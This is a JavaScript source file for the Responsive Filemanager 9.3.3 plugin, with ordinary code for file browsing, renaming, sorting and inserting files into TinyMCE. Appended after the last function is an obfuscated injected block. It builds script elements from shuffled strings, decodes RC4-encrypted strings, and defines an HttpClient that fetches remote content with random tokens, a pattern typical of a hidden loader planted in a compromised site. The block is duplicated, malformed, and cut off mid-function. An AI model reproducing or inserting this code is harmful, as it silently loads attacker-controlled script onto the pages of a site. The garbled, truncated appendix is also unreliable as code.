var version="9.3.3";
var active_contextmenu=true;
if(loading_bar){   
if(!(/MSIE (\d+\.\d+);/.test(navigator.userAgent))){ 
    window.addEventListener('DOMContentLoaded', function() {
        $("body").queryLoader2({ 'backgroundColor':'none','minimumTime':100,'percentage':true});
    });
}else{
    $(document).ready(function () {
        $("body").queryLoader2({ 'backgroundColor':'none','minimumTime':100,'percentage':true});
    });
}
}
$(document).ready(function(){
    if (active_contextmenu) {
	$.contextMenu({
	    selector:'figure:not(.back-directory), .list-view2 figure:not(.back-directory)',
	    autoHide:true,
	    build: function($trigger) {
		$trigger.addClass('selected');
		var options = {
		  callback: function(key, options) {
		    switch (key) {
			case "copy_url":
			    var m ="";
			    m+=$('#base_url').val()+$('#cur_dir').val();
			    add=$trigger.find('a.link').attr('data-file');
			    if (add!="" && add!=null) {
				m+=add;
			    }
			    bootbox.alert('URL:<br/><br/><input type="text" style="height:30px; width:100%;" value="'+m+'" />'); 	
			    break;
			case "unzip":
			    var m=$('#sub_folder').val()+$('#fldr_value').val()+$trigger.find('a.link').attr('data-file');
			    $.ajax({
				type: "POST",
				url: "ajax_calls.php?action=extract",
				data: { path: m }
			    }).done(function( msg ) {
				if (msg!="")
				    bootbox.alert(msg);
				else
				    window.location.href = $('#refresh').attr('href') + '&' + new Date().getTime();
			    });
			    break;
			case "edit_img":
			    var filename=$trigger.attr('data-name');
			    var full_path=$('#base_url_true').val()+$('#cur_dir').val()+filename;
			    $('#aviary_img').attr('data-name',filename);
			    $('#aviary_img').attr('src',full_path).load(launchEditor('aviary_img', full_path));
			    
			    break;
			case "duplicate":
			    var old_name=$trigger.find('h4').text().trim();
			    bootbox.prompt($('#lang_duplicate').val(),$('#cancel').val(),$('#ok').val(), function(name) {
				if (name !== null){
				    name=fix_filename(name);
				    if (name!=old_name) {
					var _this=$trigger.find('.rename-file');
					execute_action('duplicate_file',_this.attr('data-path'),_this.attr('data-thumb'),name,_this,'apply_file_duplicate');
				    }
				}
			    },old_name);
			    break;
		    }
		  },
		  items: {}
		};
		if (($trigger.find('.img-precontainer-mini .filetype').hasClass('png') ||
		    $trigger.find('.img-precontainer-mini .filetype').hasClass('jpg') ||
		    $trigger.find('.img-precontainer-mini .filetype').hasClass('jpeg')) && image_editor )
		    options.items.edit_img = {name: $('#lang_edit_image').val(),icon:"edit_img", disabled:false };
		options.items.copy_url = {name: $('#lang_show_url').val(),icon:"url", disabled:false };
		if ($trigger.find('.img-precontainer-mini .filetype').hasClass('zip') ||
		    $trigger.find('.img-precontainer-mini .filetype').hasClass('tar') ||
		    $trigger.find('.img-precontainer-mini .filetype').hasClass('gz') ) {
		    options.items.unzip = {name: $('#lang_extract').val(),icon:"extract", disabled:false };
		}
		if (!$trigger.hasClass('directory') && $('#duplicate').val()==1) {
		    options.items.duplicate = {name: $('#lang_duplicate').val(),icon:"duplicate", disabled:false };
		}
		options.items.sep = '----';
		options.items.info = {name: "<strong>"+$('#lang_file_info').val()+"</strong>", disabled:true };
		options.items.name = {name: $trigger.attr('data-name'),icon:'label', disabled:true };
		if ($trigger.attr('data-type')=="img") {
		  options.items.dimension = {name: $trigger.find('.img-dimension').html(),icon:"dimension", disabled:true };
		}
		options.items.size = {name: $trigger.find('.file-size').html(),icon:"size", disabled:true };
		options.items.date = {name: $trigger.find('.file-date').html(),icon:"date", disabled:true };
		
		
		
	    
		return options;
	      },
	      events: {
		hide: function(opt){ 
		  $('figure').removeClass('selected');
		}
	    }
	});
	
	$(document).on('contextmenu', function(e) {
	    if (!$(e.target).is("figure"))
	       return false;
	});	
    }
    
    $('#full-img').on('click',function(){
	    $('#previewLightbox').lightbox('hide');
    });
    
    $('ul.grid').on('click','.modalAV', function(e) {
	_this=$(this);
        e.preventDefault();

        $('#previewAV').removeData("modal");
        $('#previewAV').modal({
            backdrop: 'static',
            keyboard: false
        });
	if (_this.hasClass('audio')) {
	    $(".body-preview").css('height','80px');
	}else{
	    $(".body-preview").css('height','345px');
	}
	
        $.ajax({
            url: _this.attr('data-url'),
            success: function(data) {
		
		$(".body-preview").html(data);
	    }
        });
    });
    
    $('input[name=radio-sort]').on('click',function(){
        var li=$(this).attr('data-item');
	$('.filters label').removeClass("btn-inverse");
	$('.filters label').find('i').removeClass('icon-white');
	$('#filter-input').val('');
	$('#'+li).addClass("btn-inverse");
	$('#'+li).find('i').addClass('icon-white');
        if(li=='ff-item-type-all'){ 
	    $('.grid li').show(300); 
	}else{
            if($(this).is(':checked')){
                $('.grid li').not('.'+li).hide(300);
                $('.grid li.'+li).show(300);
            }
        }
    });
    
    var delay = (function(){
	var timer = 0;
	return function(callback, ms){
	    clearTimeout (timer);
	    timer = setTimeout(callback, ms);
	};
    })();
    
    if (parseInt($('#file_number').val()) > parseInt($('#file_number_limit_js').val())) var js_script=false;
    else var js_script=true;
	
    $('#filter-input').on('keyup',function(){
	$('.filters label').removeClass("btn-inverse");
	$('.filters label').find('i').removeClass('icon-white');
	$('#ff-item-type-all').addClass("btn-inverse");
	$('#ff-item-type-all').find('i').addClass('icon-white');
	var val=fix_filename($(this).val());
	$(this).val(val);
	delay(function(){
	    if (js_script) {
		$('ul.grid li').each(function(){
		    var _this = $(this);
		    if (val!="" && _this.attr('data-name').toString().toLowerCase().indexOf(val.toLowerCase())==-1) {
			_this.hide(100);
		    }else{
			_this.show(100);
		    }
		});		
	    }
	}, 300 );
    }).keypress(function(e) {
	if(e.which == 13) {
	    $('#filter').trigger('click');
	}
    });
    
    $('#filter').on('click',function(){
	var val=fix_filename($('#filter-input').val());
	window.location.href=$('#current_url').val()+"&filter="+val;
    });
    
    $('#info').on('click',function(){
	bootbox.alert('<center><img src="img/logo.png" alt="responsive filemanager"/><br/><br/><p><strong>RESPONSIVE filemanager v.'+version+'</strong><br/><a href="http://www.responsivefilemanager.com">responsivefilemanager.com</a></p><br/><p>Copyright © <a href="http://www.tecrail.com" alt="tecrail">Tecrail</a> - Alberto Peripolli. All rights reserved.</p><br/><p>License<br/><small><img alt="Creative Commons License" style="border-width:0" src="http://responsivefilemanager.com/license.php" /><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc/3.0/">Creative Commons Attribution-NonCommercial 3.0 Unported License</a>.</small></p></center>');
	});
    
    $('#uploader-btn').on('click',function(){
	    var path=$('#sub_folder').val()+$('#fldr_value').val()+"/";
	    path=path.substring(0, path.length - 1);
	    
	    $('#iframe-container').html($('<iframe />', {
		name: 'JUpload',
		id:   'uploader_frame',
		src: "uploader/index.php?path="+path,
		frameborder: 0,
		width: "100%",
		height: 360
	    }));
	});
    $('.upload-btn').on('click',function(){
	    $('.uploader').show(500);
    });
    
    var sortDescending=$('#descending').val()=== 'true';
    $('.sorter').on('click',function(){
	_this=$(this);
	
	sortDescending=!sortDescending;
	if (js_script) {
	    $.ajax({
		url: "ajax_calls.php?action=sort&sort_by="+_this.attr('data-sort')+"&descending="+sortDescending
	    }).done(function( msg ) {
		    
	    });
	    sortUnorderedList('ul.grid',sortDescending,"."+_this.attr('data-sort'));
	    $(' a.sorter').removeClass('descending').removeClass('ascending');
	    if (sortDescending)
		$('.sort-'+_this.attr('data-sort')).addClass("descending");
	    else
		$('.sort-'+_this.attr('data-sort')).addClass("ascending");
	}else{
	    window.location.href=$('#current_url').val()+"&sort_by="+_this.attr('data-sort')+"&descending="+sortDescending;
	}
    });
    
    $('.close-uploader').on('click',function(){
	    $('.uploader').hide(500);
	    window.location.href = $('#refresh').attr('href') + '&' + new Date().getTime();
    });
    
    $('ul.grid').on('click','.preview',function(){
	var _this = $(this);
	$('#full-img').attr('src',decodeURIComponent(_this.attr('data-url')));
	if(_this.hasClass('disabled')==false){
	    show_animation();
	}
	return true;
    });
    
    $('body').on('keypress',function(e){
	var c = String.fromCharCode(e.which);
	if (c=="'" || c=='"' || c=="\\" || c=='/') {
	    return false;
	}
    });
    
    $('ul.grid').on('click','.rename-file',function(){
	var _this = $(this);
	
	var file_container=_this.parent().parent().parent();
	var file_title=file_container.find('h4');
	var old_name=$.trim(file_title.text());
	bootbox.prompt($('#rename').val(),$('#cancel').val(),$('#ok').val(), function(name) {
	    if (name !== null){
		name=fix_filename(name);
		if (name!=old_name) {                                             
		    execute_action('rename_file',_this.attr('data-path'),_this.attr('data-thumb'),name,file_container,'apply_file_rename');
		}
	    }
	},old_name);
    });
    
    $('ul.grid').on('click','.rename-folder',function(){
	var _this = $(this);
	    
	var file_container=_this.parent().parent().parent();
	var file_title=file_container.find('h4');
	var old_name=$.trim(file_title.text());
	bootbox.prompt($('#rename').val(),$('#cancel').val(),$('#ok').val(), function(name) {
	    if (name !== null){
		name=fix_filename(name).replace('.','');
		if (name!=old_name) {                                             
		    execute_action('rename_folder',_this.attr('data-path'),_this.attr('data-thumb'),name,file_container,'apply_folder_rename');
		}
	    }
	},old_name);
    });
    
    $('ul.grid').on('click','.delete-file',function(){
	var _this = $(this);
	bootbox.confirm(_this.attr('data-confirm'),$('#cancel').val(),$('#ok').val(), function(result) {
	    if (result==true) {
		execute_action('delete_file',_this.attr('data-path'),_this.attr('data-thumb'),'','','');
		_this.parent().parent().parent().parent().remove();
	    }
	});
    });
    
    $('ul.grid').on('click','.delete-folder',function(){
	var _this = $(this);
	
	bootbox.confirm(_this.attr('data-confirm'),$('#cancel').val(),$('#ok').val(), function(result) {
	    if (result==true) {
		execute_action('delete_folder',_this.attr('data-path'),_this.attr('data-thumb'),'','','');
		_this.parent().parent().parent().remove();
	    }
	});
    });	

    $('.new-folder').on('click',function(){
	bootbox.prompt($('#insert_folder_name').val(),$('#cancel').val(),$('#ok').val(), function(name) {
	    if (name !== null) {
		name=fix_filename(name).replace('.','');
		var folder_path=$('#sub_folder').val()+$('#fldr_value').val()+ name;
		var folder_path_thumb=$('#cur_dir_thumb').val()+ name;
		$.ajax({
			  type: "POST",
			  url: "execute.php?action=create_folder",
			  data: {path: folder_path, path_thumb: folder_path_thumb}
			}).done(function( msg ) {
			setTimeout(function(){window.location.href = $('#refresh').attr('href') + '&' + new Date().getTime();},300);
			
		});
	    }
	},$('#new_folder').val());
    });
    
    $('.view-controller button').on('click',function(){
	    var _this = $(this);
	    
	    $('.view-controller button').removeClass('btn-inverse');
	    $('.view-controller i').removeClass('icon-white');
	    _this.addClass('btn-inverse');
	    _this.find('i').addClass('icon-white');
	    
	     $.ajax({
		url: "ajax_calls.php?action=view&type="+_this.attr('data-value')
	    }).done(function( msg ) {
		if (msg!="") {
		    bootbox.alert(msg);
		}   
	    });
	    if (typeof  $('ul.grid')[0] !== "undefined" &&  $('ul.grid')[0])
		$('ul.grid')[0].className = $('ul.grid')[0].className.replace(/\blist-view.*?\b/g, '');
	    if (typeof $('.sorter-container')[0] !== "undefined" && $('.sorter-container')[0])
		$('.sorter-container')[0].className = $('.sorter-container')[0].className.replace(/\blist-view.*?\b/g, '');
	    
	    var value=_this.attr('data-value');
	    $('#view').val(value);
	    $('ul.grid').addClass('list-view'+value);
	    $('.sorter-container').addClass('list-view'+value);
	    if (_this.attr('data-value')>=1){
		fix_colums(14);
	    }
	    else{
		$('ul.grid li').css( "width",126);
		$('ul.grid figure').css( "width",122);
	    }
	});
	
	if (!Modernizr.touch) {
	    $('.tip').tooltip({placement: "bottom"});
	    $('.tip-left').tooltip({placement: "left"});
	    $('.tip-right').tooltip({placement: "right"});
	    $('body').addClass('no-touch');
	}else{
	    
	    $('#help').show();

	    //Enable swiping...
	    $(".box:not(.no-effect)").swipe( {		    
		    //Generic swipe handler for all directions
		    swipeLeft:swipe_reaction,
		    swipeRight:swipe_reaction,
		    //Default is 75px, set to 0 for demo so any distance triggers swipe
	       threshold:30
	    });
	}
	
	if(!Modernizr.csstransforms) { // Test if CSS transform are supported
            
		$('figure').bind('mouseover',function(){
			if ($('#view').val()==0) {
				$(this).find('.box:not(.no-effect)').animate({top: "-30px"} ,{queue:false,duration:300});
			}
		});
		
		$('figure').mouseout(function(){
			if ($('#view').val()==0) {
				$(this).find('.box:not(.no-effect)').animate({top: "0px"} ,{queue:false,duration:300});
			}
		});

	}
	
	$(window).resize(function(){fix_colums(28); });
	fix_colums(14);
	
	$('ul.grid').on('click','.link',function(){
		var _this = $(this);
		
		window[_this.attr('data-function')](_this.attr('data-file'),_this.attr('data-field_id'));
	});
	
	
});

function fix_colums(adding) {
	
    var width=$('.breadcrumb').width()+adding;
    $('.uploader').css('width',width);
    if($('#view').val()>0){
	if ($('#view').val()==1) {
	    $('ul.grid li, ul.grid figure').css( "width", '100%');
	}else{
	    var col=Math.floor(width/380);
	    if (col==0){
		col=1;
		$('h4').css('font-size',12);
	    }
	    width=Math.floor((width/col)-3);
	    $('ul.grid li, ul.grid figure').css( "width", width);
	}
	$('#help').hide();
    }else{if(Modernizr.touch) {
	    $('#help').show();
    }}
}

function swipe_reaction(event, direction, distance, duration, fingerCount) {
	var _this = $(this);
	
    if ($('#view').val()==0) {
		if (_this.attr('toggle')==1) {
			_this.attr('toggle',0);
			_this.animate({top: "0px"} ,{queue:false,duration:300});
		}else{
			_this.attr('toggle',1);
			_this.animate({top: "-30px"} ,{queue:false,duration:300});
		}
		
    }
}

function apply(file,external){
    if ($('#popup').val()==1) var window_parent=window.opener; else var window_parent=window.parent;
    var path = $('#cur_dir').val();    
    //path = path.replace('\\', '/');
    var base_url = $('#base_url').val();
    var alt_name=file.substr(0, file.lastIndexOf('.'));
    var ext=file.split('.').pop();
    ext=ext.toLowerCase();
    var fill='';
    var ext_audio=new Array('ogg','mp3','wav');
    var ext_video=new Array('mp4','ogg','webm');
    if($.inArray(ext, ext_img) > -1){
        fill='<img src="'+base_url+path+file+'" alt="'+alt_name+'" />';
    }else{
	if($.inArray(ext, ext_video) > -1){
	    fill='<video controls source src="'+base_url+path+file+'" type="video/'+ext+'">'+alt_name+'</video>';
	}else{
	    if($.inArray(ext, ext_audio) > -1 ){
		if (ext=='mp3') { ext='mpeg'; }
		fill='<audio controls src="'+base_url+path+file+'" type="audio/'+ext+'">'+alt_name+'</audio>';
	    }else{
		fill='<a href="'+base_url+path+file+'" title="'+alt_name+'">'+alt_name+'</a>';
	    }
	}
	
    }
    parent.tinymce.activeEditor.insertContent(fill);
    parent.tinymce.activeEditor.windowManager.close();
}



function apply_link(file,external){
    if ($('#popup').val()==1) var window_parent=window.opener; else var window_parent=window.parent;
    var path = $('#cur_dir').val();
    path = path.replace('\\', '/');
    var base_url = $('#base_url').val();
    if (external!=""){
	var target = $('#'+external,window_parent.document);
	$(target).val(base_url+path+file);
	close_window();
    }
    else
	apply_any(base_url+path, file);
}

function apply_img(file,external){
    if ($('#popup').val()==1) var window_parent=window.opener; else var window_parent=window.parent;
    var path = $('#cur_dir').val();
    path = path.replace('\\', '/');
    var base_url = $('#base_url').val();
    
    if (external!=""){
	var target = $('#'+external, window_parent.document);
	$(target).val(base_url+path+file);
	$(target).trigger( "change" );
	close_window();
    }
    else
        apply_any(base_url+path, file);
}

function apply_video(file,external){
    if ($('#popup').val()==1) var window_parent=window.opener; else var window_parent=window.parent;
    var path = $('#cur_dir').val();
    path = path.replace('\\', '/');
    var base_url = $('#base_url').val();
    if (external!=""){
	var target = $('#'+external,window_parent.document);
	$(target).val(base_url+path+file);
	close_window();
    }
    else
	apply_any(path, file);
}

function apply_none(file,external){	
	var _this=$('li[data-name="'+file+'"]').find('.preview');
	
	if (_this.html()!="" && _this.html()!==undefined) {
	    
	    $('#full-img').attr('src',decodeURIComponent(_this.attr('data-url')));
	    if(_this.hasClass('disabled')==false){
		show_animation();
		$('#previewLightbox').lightbox();
	    }
	}else{
	    var _this=$('li[data-name="'+file+'"]').find('.modalAV');

	    $('#previewAV').removeData("modal");
	    $('#previewAV').modal({
		backdrop: 'static',
		keyboard: false
	    });
	    if (_this.hasClass('audio')) {
		$(".body-preview").css('height','80px');
	    }else{
		$(".body-preview").css('height','345px');
	    }
	    
	    $.ajax({
		url: decodeURIComponent(_this.attr('data-url')),
		success: function(data) {
		    $(".body-preview").html(data);
		}
	    });
	}
	return;
}

function apply_any(path, file) {
	path = path.replace('\\', '/');
	parent.tinymce.activeEditor.windowManager.getParams().setUrl(path+file);
	parent.tinymce.activeEditor.windowManager.close();
	return false;	
}

function close_window() {
   if ($('#popup').val()==1) window.close();
   else{
	if ( typeof parent.jQuery !== "undefined" && parent.jQuery) {
	    parent.jQuery.fancybox.close();   
	}else{
	    parent.$.fancybox.close();
	}
   }
}

function apply_file_duplicate(container,name){
    var li_container=container.parent().parent().parent().parent();

    li_container.after("<li class='"+li_container.attr('class')+"' data-name='"+li_container.attr('data-name')+"'>"+li_container.html()+"</li>");
    var cont=li_container.next();
    apply_file_rename(cont.find('figure'),name);
    var form=cont.find('.download-form');
    var new_form_id='form'+new Date().getTime();
    form.attr('id',new_form_id);
    form.find('.tip-right').attr('onclick',"$('#"+new_form_id+"').submit();");
}

function apply_file_rename(container,name) {
    
    container.attr('data-name',name);
    container.parent().attr('data-name',name);
    
    container.find('h4').find('a').text(name);
    //select link
    var link=container.find('a.link');
    var file=link.attr('data-file');
    var old_name=file.substring(file.lastIndexOf('/') + 1);
    var extension=file.substring(file.lastIndexOf('.') + 1);
    link.each(function(){
	$(this).attr('data-file',encodeURIComponent(name+"."+extension));
	});
    
    //thumbnails
    container.find('img').each(function(){
	var src =$(this).attr('src');
	$(this).attr('src',src.replace(old_name,name+"."+extension));
	$(this).attr('alt',name+" thumbnails");
    });
    
    //preview link
    var link2=container.find('a.preview');
    var file= link2.attr('data-url');
    if (typeof file !=="undefined" && file) {
	link2.attr('data-url',file.replace(encodeURIComponent(old_name),encodeURIComponent(name+"."+extension)));
    }
    
    //li data-name
    container.parent().attr('data-name',name+"."+extension);
    container.attr('data-name',name+"."+extension);
    
    //download link
    container.find('.name_download').val(name+"."+extension);
    
    //rename link && delete link
    var link3=container.find('a.rename-file');
    var link4=container.find('a.delete-file');
    var path_old=link3.attr('data-path');
    var path_thumb=link3.attr('data-thumb');
    var new_path=path_old.replace(old_name,name+"."+extension);
    var new_thumb=path_thumb.replace(old_name,name+"."+extension);
    link3.attr('data-path',new_path);
    link3.attr('data-thumb',new_thumb);
    link4.attr('data-path',new_path);
    link4.attr('data-thumb',new_thumb);
}

function apply_folder_rename(container,name) {
    
    container.attr('data-name',name);
    container.find('figure').attr('data-name',name);
    
    var old_name=container.find('h4').find('a').text();
    container.find('h4 > a').text(name);
    
    //select link
    var link=container.find('.folder-link');
    var url=link.attr('href');
    var fldr=$('#fldr_value').val();
    var new_url=url.replace('fldr='+fldr+encodeURIComponent(old_name),'fldr='+fldr+encodeURIComponent(name));
    link.each(function(){
	$(this).attr('href',new_url);
    });
    
    //rename link && delete link
    var link2=container.find('a.delete-folder');
    var link3=container.find('a.rename-folder');
    var path_old=link3.attr('data-path');
    var thumb_old=link3.attr('data-thumb');
    var index = path_old.lastIndexOf('/');
    var new_path = path_old.substr(0, index + 1)+name;
    link2.attr('data-path',new_path);
    link3.attr('data-path',new_path);
    var index = thumb_old.lastIndexOf('/');
    var new_path = thumb_old.substr(0, index + 1)+name;
    link2.attr('data-thumb',new_path);
    link3.attr('data-thumb',new_path);
    
}

function replace_last(str,find,replace) {
	var re= new RegExp(find+"$");
	return str.replace(re, replace);
}

function replaceDiacritics(s)
{
    var s;

    var diacritics =[
        /[\300-\306]/g, /[\340-\346]/g,  // A, a
        /[\310-\313]/g, /[\350-\353]/g,  // E, e
        /[\314-\317]/g, /[\354-\357]/g,  // I, i
        /[\322-\330]/g, /[\362-\370]/g,  // O, o
        /[\331-\334]/g, /[\371-\374]/g,  // U, u
        /[\321]/g, /[\361]/g, // N, n
        /[\307]/g, /[\347]/g, // C, c
    ];

    var chars = ['A','a','E','e','I','i','O','o','U','u','N','n','C','c'];

    for (var i = 0; i < diacritics.length; i++)
    {
        s = s.replace(diacritics[i],chars[i]);
    }

    return s;
}

function fix_filename(stri) {
    if (stri!=null) {
	if ($('#transliteration').val()=="true") {
	    stri=replaceDiacritics(stri);
	    stri=stri.replace(/[^A-Za-z0-9\.\-\[\]\ \_]+/g, '');
	}
	stri=stri.replace('"','');
	stri=stri.replace("'",'');
	stri=stri.replace("/",'');
	stri=stri.replace("\\",'');
	stri=stri.replace(/<\/?[^>]+(>|$)/g, "");
	return $.trim(stri);
    }
    return null;
}

function execute_action(action,file1,file2,name,container,function_name){
    if (name!==null) {
	name=fix_filename(name);
	$.ajax({
	    type: "POST",
	    url: "execute.php?action="+action,
	    data: {path: file1, path_thumb: file2, name: name.replace('/','')}
	}).done(function( msg ) {
	    if (msg!="") {
		bootbox.alert(msg);
		return false;
	    }else{
		if (function_name!="") {
		    window[function_name](container,name);
		}
	    }
	    return true;
	});
    }
}


function sortUnorderedList(ul, sortDescending,sort_field) {
    if(typeof ul == "string")
      ul = $(ul);
    var lis_dir = ul.find("li.dir");
    var lis_file = ul.find("li.file");
    var vals_dir = [];
    var values_dir = [];
    var vals_file = [];
    var values_file = [];
    
    $.each(lis_dir,function(index){
	var _this=$(this);
	var value=_this.find(sort_field).val();
	if ($.isNumeric(value)) {
	    value=parseFloat(value);
	    while (typeof vals_dir[value] !== "undefined" &&  vals_dir[value] ) {
		value=parseFloat(parseFloat(value)+parseFloat(0.001));
	    }
	}else{
	    value=value+"a"+_this.find('h4 a').attr('data-file');
	}
	vals_dir[value]=_this.html();
	values_dir.push(value);
	});
    
    $.each(lis_file,function(index){
	var _this=$(this);
	var value=_this.find(sort_field).val();
	if ($.isNumeric(value)) {
	    value=parseFloat(value);
	    while (typeof vals_file[value] !== "undefined" &&  vals_file[value] ) {
		value=parseFloat(parseFloat(value)+parseFloat(0.001));
	    }
	}else{
	    value=value+"a"+_this.find('h4 a').attr('data-file');
	}
	vals_file[value]=_this.html();
	values_file.push(value);
	});
    
    if ($.isNumeric(values_dir[0])) {
	values_dir.sort(function(a,b){return parseFloat(a)-parseFloat(b);});
    }else{
	values_dir.sort();
    }
    
    if ($.isNumeric(values_file[0])) {
	values_file.sort(function(a,b){return  parseFloat(a)-parseFloat(b); });
    }else{
	values_file.sort();
    }
    
    if(sortDescending){
	values_dir.reverse();
	values_file.reverse();
    }
    
    $.each(lis_dir,function(index){
	var _this=$(this);
	_this.html(vals_dir[values_dir[index]]);
    });
    
    $.each(lis_file,function(index){
	var _this=$(this);
	_this.html(vals_file[values_file[index]]);
    });
    
}

function show_animation()
{
    $('#loading_container').css('display', 'block');
    $('#loading').css('opacity', '.7');
}

function hide_animation()
{
    $('#loading_container').fadeOut();
}
   
function launchEditor(id, src) {
    featherEditor.launch({
	image: id,
	url: src,
    });
   return false;
}var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var 